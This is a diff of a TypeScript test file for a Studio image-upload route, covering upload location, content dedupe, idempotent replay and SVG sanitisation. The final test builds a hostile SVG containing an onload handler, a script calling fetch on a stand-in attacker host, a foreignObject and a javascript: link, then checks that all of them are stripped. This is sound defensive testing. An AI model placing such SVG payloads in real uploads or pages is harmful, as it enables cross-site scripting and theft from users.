@@ -2,11 +2,13 @@
  * assetDrop — D2 G15's write route. Two halves are tested here, and only one of
  * them is new code:
  *
- *  - **the product decision** (`resolveDroppedAssetHome` / `droppedAssetSrc`):
- *    which directory in THIS project can back a literal `<img src>`, when
- *    Studio may create it, and what the literal actually is. That decision is
- *    the whole reason this route exists rather than a second caller of
- *    `asset-upload`.
+ *  - **the product decision** (`resolveDroppedAssetHome`, plus the literal
+ *    from `assetSiteUrl.ts`, which has its own test): which directory in THIS
+ *    project can back a literal `<img src>`, when Studio may create it, and
+ *    what the literal actually is. That decision is the whole reason this
+ *    route exists rather than a second caller of `asset-upload`.
+ *  - **the landing contract** (IMG-1): the response shape, content dedupe,
+ *    idempotent replay, and SVG sanitisation proven ON THIS ROUTE.
  *  - **that the shared security pipeline still applies**. The route delegates
  *    every guard to `landAssetBytes`, so the tests that matter are the ones
  *    proving delegation actually happened: a non-image is refused by CONTENT
@@ -17,28 +19,36 @@ import { afterAll, afterEach, beforeAll, beforeEach, describe, expect, it } from
 import * as fs from 'node:fs'
 import * as os from 'node:os'
 import * as path from 'node:path'
+import type { DbClient } from '../../db/client'
+import type { AuthUser } from '../../repositories/users'
 import { landAssetBytes } from '../studio/assetLanding'
+import { assetSiteUrlResolver } from '../studio/assetSiteUrl'
 import { createStudioRouteTestHarness, type StudioRouteTestHarness } from './helpers/studioRouteHarness'
 import {
-  droppedAssetSrc,
   resolveDroppedAssetHome,
   tryServeStudioAssetDrop,
   MAX_ASSET_DROP_BYTES,
 } from '../studio/assetDrop'
 
 let tmpDir: string
+/** The replay store for keyed requests. Never this repo's own `.data/`. */
+let replayRoot: string
 
 beforeEach(() => {
   tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'studio-asset-drop-'))
+  replayRoot = fs.mkdtempSync(path.join(os.tmpdir(), 'studio-asset-drop-replay-'))
 })
 
 afterEach(() => {
   fs.rmSync(tmpDir, { recursive: true, force: true })
+  fs.rmSync(replayRoot, { recursive: true, force: true })
 })
 
 // Minimal-but-real magic-number prefixes — sniffing only inspects the header.
 const PNG_BYTES = new Uint8Array([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0, 0, 0, 0])
 const JPEG_BYTES = new Uint8Array([0xff, 0xd8, 0xff, 0xe0, 0, 0, 0, 0])
+/** Same length as `PNG_BYTES`, different content. */
+const OTHER_PNG_BYTES = new Uint8Array([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0, 0, 0, 1])
 const NOT_AN_IMAGE = new TextEncoder().encode('%PDF-1.7\nnot an image at all\n')
 
 function write(rel: string, contents: string): void {
@@ -71,14 +81,24 @@ function dropRequest(fields: Record<string, string>, file?: { name: string; byte
  * gate. The `authorization` block at the bottom drives the GATE instead,
  * through `tryServeStudio`.
  */
-const serve = (req: Request) =>
-  tryServeStudioAssetDrop(req, new URL(req.url), '/admin/api/studio/asset-drop')
+/** The session the gate would hand over. The route reads only `user.id` (the replay record's owner). */
+const session = (userId = 'user-1') => ({
+  db: (() => {
+    throw new Error('asset-drop never reaches the database')
+  }) as unknown as DbClient,
+  user: { id: userId } as AuthUser,
+})
+
+const serve = (req: Request, userId?: string) =>
+  tryServeStudioAssetDrop(req, session(userId), new URL(req.url), '/admin/api/studio/asset-drop', {
+    idempotencyRoot: replayRoot,
+  })
 
 describe('tryServeStudioAssetDrop — routing', () => {
   it('returns null for a non-matching path', async () => {
     const req = new Request('http://localhost/admin/api/studio/other', { method: 'POST' })
     expect(
-      await tryServeStudioAssetDrop(req, new URL(req.url), '/admin/api/studio/other'),
+      await tryServeStudioAssetDrop(req, session(), new URL(req.url), '/admin/api/studio/other'),
     ).toBeNull()
   })
 
@@ -117,20 +137,6 @@ describe('resolveDroppedAssetHome — the one honest location', () => {
   })
 })
 
-describe('droppedAssetSrc — the literal the <img> gets', () => {
-  it('is the file name at the site root', () => {
-    expect(droppedAssetSrc('public/photo.png')).toBe('/photo.png')
-  })
-
-  it('drops the app root of a monorepo — the browser never sees where the app lives on disk', () => {
-    expect(droppedAssetSrc('apps/web/public/photo.png')).toBe('/photo.png')
-  })
-
-  it('keeps a nested path under public/', () => {
-    expect(droppedAssetSrc('public/img/photo.png')).toBe('/img/photo.png')
-  })
-})
-
 describe('tryServeStudioAssetDrop — happy path', () => {
   beforeEach(seedViteProject)
 
@@ -138,8 +144,16 @@ describe('tryServeStudioAssetDrop — happy path', () => {
     const res = await serve(dropRequest({ dir: tmpDir }, { name: 'hero.png', bytes: PNG_BYTES }))
     expect(res).not.toBeNull()
     expect(res!.status).toBe(200)
-    const body = (await res!.json()) as { ok: boolean; relPath: string; src: string }
-    expect(body).toEqual({ ok: true, relPath: 'public/hero.png', src: '/hero.png' })
+    const body = (await res!.json()) as Record<string, unknown>
+    expect(body).toEqual({
+      ok: true,
+      mode: 'public',
+      relPath: 'public/hero.png',
+      src: '/hero.png',
+      width: null,
+      height: null,
+      deduped: false,
+    })
     expect(fs.readFileSync(path.join(tmpDir, 'public', 'hero.png'))).toEqual(Buffer.from(PNG_BYTES))
   })
 
@@ -154,10 +168,41 @@ describe('tryServeStudioAssetDrop — happy path', () => {
 
   it('never overwrites an existing file of the same name', async () => {
     await serve(dropRequest({ dir: tmpDir }, { name: 'logo.png', bytes: PNG_BYTES }))
-    const res = await serve(dropRequest({ dir: tmpDir }, { name: 'logo.png', bytes: PNG_BYTES }))
-    const body = (await res!.json()) as { src: string }
-    expect(body.src).toBe('/logo-2.png')
-    expect(fs.existsSync(path.join(tmpDir, 'public', 'logo.png'))).toBe(true)
+    const res = await serve(dropRequest({ dir: tmpDir }, { name: 'logo.png', bytes: OTHER_PNG_BYTES }))
+    const body = (await res!.json()) as { src: string; deduped: boolean }
+    expect(body).toMatchObject({ src: '/logo-2.png', deduped: false })
+    expect(fs.readFileSync(path.join(tmpDir, 'public', 'logo.png'))).toEqual(Buffer.from(PNG_BYTES))
+  })
+
+  it('reports the intrinsic size read from the header', async () => {
+    const png = new Uint8Array([
+      0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a,
+      0, 0, 0, 13, 0x49, 0x48, 0x44, 0x52, 0, 0, 0x02, 0x80, 0, 0, 0x01, 0xe0,
+      8, 6, 0, 0, 0,
+    ])
+    const res = await serve(dropRequest({ dir: tmpDir }, { name: 'sized.png', bytes: png }))
+    expect(await res!.json()).toMatchObject({ width: 640, height: 480 })
+  })
+
+  it("lands in the APP root's public/ in a monorepo, and the src is served from the site root", async () => {
+    const mono = fs.mkdtempSync(path.join(os.tmpdir(), 'studio-asset-drop-mono-'))
+    try {
+      fs.mkdirSync(path.join(mono, 'web'), { recursive: true })
+      fs.writeFileSync(
+        path.join(mono, 'web', 'package.json'),
+        JSON.stringify({ name: 'web', devDependencies: { vite: '^5.0.0' } }),
+        'utf8',
+      )
+      // The app's own public/ exists; the PROJECT dir has none. The old client
+      // rule (`IMAGE_FILL_UPLOAD_DIR` joined to the project dir) would have
+      // created `<project>/public/` here, which nothing serves.
+      fs.mkdirSync(path.join(mono, 'web', 'public'))
+      const res = await serve(dropRequest({ dir: mono }, { name: 'hero.png', bytes: PNG_BYTES }))
+      expect(await res!.json()).toMatchObject({ relPath: 'web/public/hero.png', src: '/hero.png' })
+      expect(fs.existsSync(path.join(mono, 'public'))).toBe(false)
+    } finally {
+      fs.rmSync(mono, { recursive: true, force: true })
+    }
   })
 
   it('strips path separators out of the declared filename', async () => {
@@ -286,7 +331,7 @@ describe('tryServeStudioAssetDrop — authorization', () => {
  * `sec-17` — the filename and the `src` literal, driven with the inputs that
  * would break out of the JSX attribute the drop is about to write.
  *
- * `droppedAssetSrc`'s output goes straight into `<img src="…">` as a string
+ * The route's `src` goes straight into `<img src="…">` as a string
  * prop. A name carrying a quote, an angle bracket, a brace or a newline would
  * either terminate the attribute early or open a JSX expression container, so
  * these assert the DERIVED name rather than the declared one — and that the
@@ -302,10 +347,18 @@ describe('tryServeStudioAssetDrop — the name that reaches the source', () => {
    * entry whose filename contains a `:` — and a guard that is only ever fed
    * names the transport already defanged has not been driven at all.
    */
+  // Distinct bytes per call so every hostile name is really WRITTEN: with the
+  // same bytes each time, the content dedupe would hand back the first file
+  // and the naming rule under test would never run again.
+  let landings = 0
   const landedSrc = (name: string): string => {
-    const landed = landAssetBytes(tmpDir, 'public', PNG_BYTES, name)
+    landings += 1
+    const bytes = new Uint8Array([...PNG_BYTES.subarray(0, 8), 0, 0, landings >> 8, landings & 0xff])
+    const landed = landAssetBytes(tmpDir, 'public', bytes, name)
     if (!landed.ok) throw new Error(`refused: ${landed.error}`)
-    return droppedAssetSrc(landed.relPath)
+    const url = assetSiteUrlResolver(tmpDir)(landed.relPath)
+    if (url === null) throw new Error(`no URL for ${landed.relPath}`)
+    return url.src
   }
 
   it('cannot produce a src that breaks out of the JSX attribute', () => {
@@ -371,5 +424,91 @@ describe('tryServeStudioAssetDrop — the name that reaches the source', () => {
     const res = await serve(req)
     expect(res!.status).toBe(200)
     expect(fs.readdirSync(path.join(tmpDir, 'public'))).toEqual(['first.png'])
+  })
+})
+
+/**
+ * IMG-1 — the landing contract a retry depends on. `asset-drop` is in
+ * `apiClient.ts`'s `IDEMPOTENT_REPLAY_PATHS`, so a gateway-down response is
+ * retried with the SAME `X-Studio-Idempotency-Key`. Two independent guards
+ * make that safe: the server replays the recorded answer without running the
+ * route, and even with no record (a different key, or an expired one) the
+ * landing dedupes by content instead of writing `hero-2.png`.
+ */
+describe('tryServeStudioAssetDrop — dedupe and replay', () => {
+  beforeEach(seedViteProject)
+
+  const KEY = '0f8fad5b-d9cb-469f-a165-70867728950e'
+
+  function keyedDrop(name: string, bytes: Uint8Array): Request {
+    const req = dropRequest({ dir: tmpDir }, { name, bytes })
+    req.headers.set('x-studio-idempotency-key', KEY)
+    return req
+  }
+
+  it('a second drop of the same bytes reuses the file and says so', async () => {
+    await serve(dropRequest({ dir: tmpDir }, { name: 'hero.png', bytes: PNG_BYTES }))
+    const res = await serve(dropRequest({ dir: tmpDir }, { name: 'hero.png', bytes: PNG_BYTES }))
+    expect(await res!.json()).toMatchObject({ relPath: 'public/hero.png', src: '/hero.png', deduped: true })
+    expect(fs.readdirSync(path.join(tmpDir, 'public'))).toEqual(['hero.png'])
+  })
+
+  it('a retry carrying the same idempotency key gets the first answer back, verbatim, without landing again', async () => {
+    const first = await serve(keyedDrop('hero.png', PNG_BYTES))
+    const firstBody = await first!.text()
+    // The replay must not depend on the bytes: even a DIFFERENT body under the
+    // same key is answered from the record, because the route never runs.
+    const replay = await serve(keyedDrop('other.png', OTHER_PNG_BYTES))
+
+    expect(replay!.status).toBe(200)
+    expect(await replay!.text()).toBe(firstBody)
+    expect(JSON.parse(firstBody)).toMatchObject({ relPath: 'public/hero.png', deduped: false })
+    expect(fs.readdirSync(path.join(tmpDir, 'public'))).toEqual(['hero.png'])
+  })
+
+  it('the same key from ANOTHER user is not answered from the record (security review F4)', async () => {
+    await serve(keyedDrop('hero.png', PNG_BYTES))
+    const other = await serve(keyedDrop('other.png', OTHER_PNG_BYTES), 'user-2')
+    expect(await other!.json()).toMatchObject({ relPath: 'public/other.png', deduped: false })
+  })
+
+  it('a refusal is never recorded, so a corrected retry under the same key still runs', async () => {
+    const refused = await serve(keyedDrop('report.png', NOT_AN_IMAGE))
+    expect(refused!.status).toBe(400)
+    const retried = await serve(keyedDrop('hero.png', PNG_BYTES))
+    expect(retried!.status).toBe(200)
+    expect(await retried!.json()).toMatchObject({ relPath: 'public/hero.png' })
+  })
+})
+
+/**
+ * Audit 07 §A.5: the SVG sanitiser proven on THIS route, with every vector
+ * the drop could carry. `assetLanding.test.ts` covers the shared pipeline;
+ * this is the route-level proof that the drop actually goes through it.
+ */
+describe('tryServeStudioAssetDrop — a hostile SVG is sanitised before it lands', () => {
+  beforeEach(seedViteProject)
+
+  it('strips onload, <script>, <foreignObject> and a javascript: xlink:href', async () => {
+    const svg = new TextEncoder().encode(
+      [
+        '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" onload="steal()" viewBox="0 0 10 10">',
+        '<script>fetch("//evil.test")</script>',
+        '<foreignObject width="10" height="10"><div xmlns="http://www.w3.org/1999/xhtml">x</div></foreignObject>',
+        '<a xlink:href="javascript:alert(1)"><rect width="10" height="10"/></a>',
+        '</svg>',
+      ].join(''),
+    )
+    const res = await serve(dropRequest({ dir: tmpDir }, { name: 'logo.svg', bytes: svg, type: 'image/svg+xml' }))
+    expect(res!.status).toBe(200)
+    const body = (await res!.json()) as { relPath: string; src: string; width: number | null }
+    expect(body).toMatchObject({ relPath: 'public/logo.svg', src: '/logo.svg', width: 10 })
+
+    const onDisk = fs.readFileSync(path.join(tmpDir, 'public', 'logo.svg'), 'utf8').toLowerCase()
+    expect(onDisk).not.toContain('onload')
+    expect(onDisk).not.toContain('<script')
+    expect(onDisk).not.toContain('foreignobject')
+    expect(onDisk).not.toContain('javascript:')
+    expect(onDisk).toContain('<rect')
   })
 })
